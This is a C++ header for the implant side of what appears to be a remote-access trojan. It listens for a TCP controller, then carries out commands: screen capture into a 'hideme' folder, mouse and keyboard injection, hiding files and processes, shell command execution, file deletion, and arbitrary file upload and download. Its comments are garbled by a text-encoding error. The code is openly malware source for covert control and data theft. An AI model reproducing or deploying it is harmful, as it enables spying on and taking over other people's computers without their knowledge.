#include"MLHT.h"
#include "Op_Function.h"
#include "SceenShoot.h"


#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH+1)


//���Ľ��շ���ֵ
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1
#define FILE_OPEN_FAIL			2

#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4
#define	FILE_LS_FAIL			5

#define NOT_GET_ACK				6
#define GET_ACK					7


class MLHT_SERVER
{
public:
	//����socket
	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	int server_port;

	//�ͻ���socket
	SOCKADDR clientAddr;
	SOCKET clientsocket;

	char buffer[MLHT_MAX_LENGTH];
	
	WORD IDtt;
	
	MLHT *p_send;//��һ�������ı���
	MLHT *p_get; //��һ���յ��ı���

public:
	MLHT_SERVER(int port){

		IDtt = 1;

		p_send = new MLHT();
		p_get = new MLHT();


		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//������������Ӧ�ó����DLL���õĵ�һ��Windows Sockets������
		//������Ӧ�ó����DLLָ��Windows Sockets API�İ汾�ż�����ض�Windows Socketsʵ�ֵ�ϸ�ڡ�
		//Ӧ�ó����DLLֻ����һ�γɹ���WSAStartup()����֮����ܵ��ý�һ����Windows Sockets API����
		s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr.sin_family = PF_INET;//sin_familyָ��Э���壬��socket�����ֻ����AF_INET
		sockaddr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");   //��Ҫ�󶨵����ص��ĸ�IP��ַ
		sockaddr.sin_port = htons(port);      //��Ҫ�����Ķ˿�
		//sin_zero��Ϊ����sockaddr��sockaddr_in�������ݽṹ���ִ�С��ͬ�������Ŀ��ֽ�

		bind(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));     //���а󶨶���

		listen(s, 1);                                        //��������

	}

	//�ȴ��ͻ�������
	void WaitForClient(){
		int size = sizeof(SOCKADDR);
		clientsocket = accept(s, &clientAddr, &size);               //������ֱ������tcp�ͻ�������
		SendACKPacket();
	}

	//�ȴ����ر��ģ���ⷵ�ر����Ƿ�Ϸ�
	int WaitReturnPacket(){
		
		ZeroMemory(buffer, sizeof(buffer));

		if(recv(clientsocket, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
			if(p_get->PacketAccept(((BYTE*)buffer)))
				return PACKET_ACCEPT_SUCCESS;
			else
				return PACKET_ACCEPT_FAIL;
		}
		
		return SOCKET_ERROR;

	}

	//wait for ack packet
	int WaitforACKPacket(){

		int ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		if(p_get->PacketAnalyze_SYNACKFIN()!=MLHT_MTU_TYPE_ACK)
			return NOT_GET_ACK;

		return PACKET_ACCEPT_SUCCESS;
	}

	//��ACK���ر���
	void SendACKPacket(){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(p_get->GetPacketId(),MLHT_MTU_TYPE_ACK|p_get->GetPacketType());
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

	}

	//��FIN���ر���
	void SendFINPacket(){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(p_get->GetPacketId(),MLHT_MTU_TYPE_FIN|p_get->GetPacketType());
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

	}

	//���޲�������
	int SendPacket(WORD mtu_type){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(IDtt++,mtu_type);
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

		return WaitforACKPacket();

	}

	//������������
	int SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

 		return WaitforACKPacket();
	}

	//�����ļ���
	int SendFilePacket(
		WORD mtu_type,			//�ļ�����Э������
		char*srcfiledir			//�ļ�·��
		)
	{
		int ret;

		FILE *fp = NULL;//�����ļ�ָ��
		if (fopen_s(&fp,srcfiledir,"rb") != NULL)//���ļ�
		{
			printf("%d",errno);
			return FILE_READ_FAIL;
		}
		
		//�����ܷ�Ƭ��
		fseek(fp,0L,SEEK_END);			// ��λ���ļ�ĩβ
		int contentlen = ftell(fp);		//����ָ��ƫ���ļ�ͷ��λ��(���ļ����ַ�����)
		WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
		if(contentlen % MLHT_SLICE_FILE_LENGTH)
			slice_sum++;
		
		printf("Sending packets,Total %d packets...\n",slice_sum);

		char p[MLHT_SLICE_FILE_LENGTH]={0};//�ļ�ָ��


		//��Ƭ1->n-1: ��ͻ���/�����������ļ���Ƭ
		for(WORD slice_num = 1;slice_num < slice_sum;slice_num++){

			fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET); // ˳��λ�ļ�ָ��
			fread(p,MLHT_SLICE_FILE_LENGTH,1,fp);					 // ���ļ�ָ�뿪ʼ��

			ret = SendPacket(mtu_type,slice_num,slice_sum,p,MLHT_SLICE_FILE_LENGTH);
			if(ret != PACKET_ACCEPT_SUCCESS)
				return ret;
							
		}


		//��Ƭn ����ͻ���/���������ͽ�β��Ƭ
		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_sum-1),SEEK_SET); // ˳��λ�ļ�ָ��
		fread(p,contentlen%MLHT_SLICE_FILE_LENGTH,1,fp); // ���ļ�ָ�뿪ʼ��

		ret = SendPacket(mtu_type,slice_sum,slice_sum,p,contentlen%MLHT_SLICE_FILE_LENGTH);
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		
		printf("Send over.\n",p_send->GetPacketSliceNum(),p_send->GetPacketSliceSum());
		return PACKET_ACCEPT_SUCCESS;

	}


	//�����ļ���
	int GetFilePacket(
		char* desfilename		//�����ļ���Ŀ��·��
		)
	{

		int ret;

		FILE* fp = NULL;

		do{
			ret = WaitReturnPacket();
			switch(ret)
			{
			case PACKET_ACCEPT_SUCCESS:
				{
					fopen_s(&fp,desfilename,"ab");
					if(fp != NULL) //����һ����׷����ʽ�������д���ļ���
					{
						//��������Ƭ��������׷�ӵ���ʽд���ļ���
						if(fwrite(p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH, 1, fp)!= 1){	
							printf("%d	",errno );
							return FILE_WRITE_FAIL;
						}
						else{
							printf("Get packet %d,Total %d packets...\n",p_get->GetPacketSliceNum(),p_get->GetPacketSliceSum());
							SendACKPacket();
							printf("Send ACK packet back...\n");
							fclose(fp);
						}
					}
					else{
						printf("%d	",errno );
						return FILE_OPEN_FAIL;
					}
				}
				break;
			default:
				return ret;
			}
		}while(!p_get->IsLastPacket());

		return PACKET_ACCEPT_SUCCESS;
	}

	///RC OPERATR
	int GetScreenshoot(){
		
		char Screenshootdir[MAX_PATH] = "d:\\hideme\\screen.bmp";

		printf("ScreenShoot over,sending packet:\n");

		SceenShoot();

		return SendFilePacket(MLHT_MTU_TYPE_RC_SCREEN,Screenshootdir);
	}


	void GetMouseOperate(){

		BYTE* z = p_get->GetPacketContent();
		int x =z[0]*BYTE_SIZE+z[1];
		int y =z[2]*BYTE_SIZE+z[3];
		mouse_op(x,y);

	}


	void GetKeybroadOperate(){
		
		BYTE* z = p_get->GetPacketContent();
		int x =z[0]*BYTE_SIZE+z[1];

		keybd_op(x);

	}

	//File Operate
	void GetFileHide(){
		hide_file();
	}

	void GetFileShow(){
		show_file();
	}

	//Process Operate
	void GetProcessHide(){
		hide_process();
	}

	void GetProcessShow(){
		show_process();
	}

	//Shell Operate
	int GetShellLs(){
		char path[MLHT_MAX_LENGTH] = {0};
		//if(ListDir((char *)p_get->GetPacketContent(),path))
		if(execmd(path))
		{   printf("%s",path);
			return SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,path,strlen(path)+1);
		}
		else
			return FILE_LS_FAIL;
		
	}
		
	void GetShellMkdir(){
		if(CrtDir((char *)p_get->GetPacketContent()))
			SendACKPacket();
		else
			SendFINPacket();
	}
		
	void GetShellRmdir(){
		if(DltDir((char *)p_get->GetPacketContent()))
			SendACKPacket();
		else
			SendFINPacket();
	}
		
	void GetShellRm(){
		if(deletfile((char *)p_get->GetPacketContent()))
			SendACKPacket();
		else
			SendFINPacket();
	}
		
	//�����ϴ��ļ�
	int GetUploadFile(){
		char desfilename[MAX_PATH];
		memcpy(desfilename,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);
		printf("Upload file path: %s\n",desfilename);

		return GetFilePacket(desfilename);
	}

	//���������ļ�
	int SendDownloadFile(){
		char srcfiledir[MAX_PATH];
		memcpy(srcfiledir,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);
		printf("Download file path: %s\n",srcfiledir);
		
		return SendFilePacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,srcfiledir);

	}

 };